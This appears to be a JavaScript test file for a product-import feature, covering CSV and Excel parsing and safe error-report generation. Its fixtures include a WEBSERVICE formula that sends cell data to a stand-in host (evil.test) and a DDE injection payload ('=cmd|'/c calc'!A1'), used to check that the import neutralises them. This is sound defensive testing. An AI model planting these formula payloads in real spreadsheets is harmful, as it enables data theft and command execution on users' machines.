/**
 * Product Import — reading files: type / size / corruption checks, CSV (delimiters, quoting, encodings),
 * Excel (header detection, several sheets, formulas never evaluated, row cap), templates and the
 * error report (spreadsheet formula injection).
 */
import * as XLSX from "xlsx";
import { describe, expect, it } from "vitest";
import { ImportFileError, inspectImportFile, sniffKind } from "@/lib/productImport/fileDetect.js";
import { cellToString, parseCsvBuffer, parseDelimited, parseWorkbookBuffer, pickBestSheet } from "@/lib/productImport/tableParsing.js";
import { csvCell, errorReportCsv, productTemplateCsv } from "@/lib/productImport/importFiles.js";
import { IMPORT_LIMITS, PRODUCT_TEMPLATE_HEADERS, buildImportRows, suggestColumnMapping, validateImportRow } from "@shared/catalog/productImport.js";

const enc = (s) => new TextEncoder().encode(s).buffer;
const fileOf = (content, name, type) => new File([content], name, { type });

function workbook(sheets) {
  const wb = XLSX.utils.book_new();
  for (const [name, aoa, patch] of sheets) {
    const ws = XLSX.utils.aoa_to_sheet(aoa);
    patch?.(ws);
    XLSX.utils.book_append_sheet(wb, ws, name);
  }
  const out = XLSX.write(wb, { type: "array", bookType: "xlsx" });
  return out instanceof ArrayBuffer ? out : new Uint8Array(out).buffer;
}

describe("file checks", () => {
  it("accepts real CSV, Excel and PDF files", async () => {
    expect((await inspectImportFile(fileOf("Name,Price\nCoke,12", "p.csv", "text/csv"))).kind).toBe("csv");
    expect((await inspectImportFile(fileOf(workbook([["S", [["Name"], ["Coke"]]]]), "p.xlsx", "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"))).kind).toBe("xlsx");
    expect((await inspectImportFile(fileOf("%PDF-1.7\n...", "p.pdf", "application/pdf"))).kind).toBe("pdf");
    // Windows labels CSV as vnd.ms-excel
    expect((await inspectImportFile(fileOf("Name\nCoke", "p.csv", "application/vnd.ms-excel"))).kind).toBe("csv");
  });

  it.each([
    [fileOf("", "p.csv", "text/csv"), "EMPTY"],
    [fileOf("x", "p.docx", "application/vnd.openxmlformats-officedocument.wordprocessingml.document"), "UNSUPPORTED"],
    [fileOf("x", "p.exe", "application/octet-stream"), "UNSUPPORTED"],
    [fileOf("not a pdf", "p.pdf", "application/pdf"), "CORRUPT"],
    [fileOf("plain text", "p.xlsx", ""), "CORRUPT"],
    [fileOf("%PDF-1.7", "p.csv", "application/pdf"), "MIME_MISMATCH"],
    [fileOf(new Uint8Array([0, 1, 2, 3, 0, 0]), "p.csv", "text/csv"), "CORRUPT"],
    [fileOf("<html><script>x</script></html>", "p.xls", "application/vnd.ms-excel"), "CORRUPT"],
  ])("rejects %#", async (file, code) => {
    const err = await inspectImportFile(file).catch((e) => e);
    expect(err).toBeInstanceOf(ImportFileError);
    expect(err.code).toBe(code);
    expect(err.message).not.toMatch(/undefined|Error:/);
  });

  it("rejects files over the size limit", async () => {
    const big = { name: "big.csv", size: IMPORT_LIMITS.maxFileBytes + 1, type: "text/csv", arrayBuffer: async () => new ArrayBuffer(0) };
    await expect(inspectImportFile(big)).rejects.toMatchObject({ code: "TOO_LARGE" });
  });

  it("sniffs magic bytes", () => {
    expect(sniffKind(new Uint8Array([0x50, 0x4b, 0x03, 0x04]))).toBe("zip");
    expect(sniffKind(new Uint8Array([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1]))).toBe("ole");
  });
});

describe("CSV", () => {
  it("parses quoted fields, embedded commas and newlines", () => {
    expect(parseDelimited('Name,Description\n"Coke, can","Line 1\nLine 2"\n"Say ""hi""",x', ",")).toEqual([
      ["Name", "Description"],
      ["Coke, can", "Line 1\nLine 2"],
      ['Say "hi"', "x"],
    ]);
  });

  it("detects semicolon CSVs with decimal commas (R 1 250,00)", () => {
    const { sheets } = parseCsvBuffer(enc("Product Name;SKU;Selling Price;VAT;Stock\nBread;BRD1;R 1 250,00;15%;5\n"));
    const t = sheets[0].table;
    expect(t.headers).toEqual(["Product Name", "SKU", "Selling Price", "VAT", "Stock"]);
    const [row] = buildImportRows(t, suggestColumnMapping(t.headers).mapping);
    expect(validateImportRow(row.raw).value).toMatchObject({ name: "Bread", price: 1250, stock: 5 });
  });

  it("strips a BOM and falls back to Windows-1252", () => {
    const bom = parseCsvBuffer(enc("﻿Name,Price\nCoke,12\n")).sheets[0].table;
    expect(bom.headers[0]).toBe("Name");
    const cp1252 = new Uint8Array([...new TextEncoder().encode("Name\nCaf"), 0xe9, 0x0a]).buffer;
    expect(parseCsvBuffer(cp1252).sheets[0].table.rows[0][0]).toBe("Café");
  });

  it("finds the header row under a title and keeps sheet row numbers", () => {
    const t = parseCsvBuffer(enc("Price list September 2026\n\nProduct Name,Price,Stock\nCoke,12,50\n\nFanta,11,20\n")).sheets[0].table;
    expect(t.headerDetected).toBe(true);
    expect(t.headers).toEqual(["Product Name", "Price", "Stock"]);
    expect(t.rowNumbers).toEqual([4, 6]);
  });

  it("an empty CSV has no sheets", () => {
    expect(parseCsvBuffer(enc("\n\n")).sheets).toEqual([]);
  });
});

describe("Excel", () => {
  it("reads values as text, keeping barcodes whole", () => {
    const buf = workbook([["Products", [["Product Name", "Barcode", "Selling Price", "Stock"], ["Coke", 5449000000996, 12.5, 50]]]]);
    const t = parseWorkbookBuffer(XLSX, buf).sheets[0].table;
    expect(t.rows[0]).toEqual(["Coke", "5449000000996", "12.5", "50"]);
  });

  it("never evaluates formulas — only the cached value is read", () => {
    const buf = workbook([
      [
        "Products",
        [["Product Name", "Selling Price"], ["Coke", 0]],
        (ws) => {
          ws.B2 = { t: "n", v: 12, f: 'WEBSERVICE("http://evil.test/"&A2)' };
          ws.A3 = { t: "s", v: "Fanta", f: 'HYPERLINK("http://evil.test","Fanta")' };
          ws["!ref"] = "A1:B3";
        },
      ],
    ]);
    const t = parseWorkbookBuffer(XLSX, buf).sheets[0].table;
    expect(t.rows).toEqual([
      ["Coke", "12"],
      ["Fanta", ""],
    ]);
    expect(JSON.stringify(t)).not.toMatch(/evil|WEBSERVICE|HYPERLINK/);
  });

  it("picks the sheet that holds products", () => {
    const buf = workbook([
      ["Cover", [["Spaza Wholesale"], ["Price list"]]],
      ["Stock", [["Item", "Qty", "Unit Price"], ["Coke", 50, 12], ["Fanta", 20, 11]]],
    ]);
    const { sheets } = parseWorkbookBuffer(XLSX, buf);
    expect(sheets[pickBestSheet(sheets)].name).toBe("Stock");
  });

  it("stops reading at the row limit", () => {
    const aoa = [["Product Name", "Price"]];
    for (let i = 0; i < IMPORT_LIMITS.maxRows + 50; i++) aoa.push([`P${i}`, 1]);
    const t = parseWorkbookBuffer(XLSX, workbook([["Big", aoa]])).sheets[0].table;
    expect(t.rows.length).toBe(IMPORT_LIMITS.maxRows);
    expect(t.truncated).toBe(true);
  });

  it("throws on a corrupt workbook", () => {
    const bad = new Uint8Array([0x50, 0x4b, 0x03, 0x04, 1, 2, 3, 4, 5, 6, 7]).buffer;
    expect(() => parseWorkbookBuffer(XLSX, bad)).toThrow();
  });

  it("cell text never uses exponent notation for safe integers", () => {
    expect(cellToString(6001234567890)).toBe("6001234567890");
    expect(cellToString(0.1 + 0.2)).toBe("0.3");
  });
});

describe("templates and error report", () => {
  it("the CSV template maps every column exactly and its examples are valid", () => {
    const { sheets } = parseCsvBuffer(enc(productTemplateCsv()));
    const t = sheets[0].table;
    expect(t.headers).toEqual([...PRODUCT_TEMPLATE_HEADERS]);
    const m = suggestColumnMapping(t.headers);
    expect(m.confidence.every((c) => c === "high")).toBe(true);
    const rows = buildImportRows(t, m.mapping).map((r) => validateImportRow(r.raw));
    expect(rows.map((r) => r.errors)).toEqual([[], []]);
    expect(rows[0].value).toMatchObject({ name: "Coca Cola 330ml", sku: "COKE330", price: 12, cost_price: 8.5, stock: 50, tax_category: "standard", barcode: "5449000000996" });
  });

  it("error report has Row, Product, Reason, Suggested Fix and neutralises formulas", () => {
    const csv = errorReportCsv([{ row: 4, product: "=cmd|'/c calc'!A1", reason: "Selling price must be a number.", fix: "Enter selling price like 12.00." }]);
    const lines = csv.replace(/^﻿/, "").trim().split("\r\n");
    expect(lines[0]).toBe("Row,Product,Reason,Suggested Fix");
    expect(lines[1]).toContain(`"'=cmd|'/c calc'!A1"`);
    expect(csvCell("+SUM(1)")).toBe(`"'+SUM(1)"`);
    expect(csvCell("Coke")).toBe("Coke");
  });
});
